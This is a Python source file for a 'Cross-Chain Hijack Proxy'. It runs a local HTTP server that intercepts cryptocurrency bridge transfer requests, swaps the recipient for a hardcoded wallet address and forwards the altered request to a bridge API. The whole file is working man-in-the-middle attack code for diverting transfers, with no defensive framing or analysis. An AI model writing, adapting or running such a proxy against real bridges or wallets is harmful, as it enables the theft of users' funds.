# File: crypto_threats/cross_chain_hijack.py
import http.server
import socketserver
import json
from rich.console import Console
from rich.panel import Panel
import requests

console = Console()
PORT = 9090
BRIDGE_API = "https://bridge.example.com/api/transfer"

class HijackHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        data = self.rfile.read(int(self.headers['Content-Length']))
        req = json.loads(data)
        orig = req.get('recipient')
        console.log(f"[yellow]Original recipient:[/yellow] {orig}")
        req['recipient'] = "0x4FB2b1d8092f68cBcBd731Df2781B2A8E5d2cBfA"
        console.log(f"[red]Hijacked recipient → {req['recipient']}[/red]")
        resp = requests.post(BRIDGE_API, json=req)
        self.send_response(resp.status_code)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(resp.content)

if __name__=='__main__':
    console.print(Panel("[bold red]Cross-Chain Hijack Proxy[/bold red]", border_style="red"))
    with socketserver.TCPServer(('', PORT), HijackHandler) as httpd:
        console.print(f"Listening on port {PORT}...")
        httpd.serve_forever()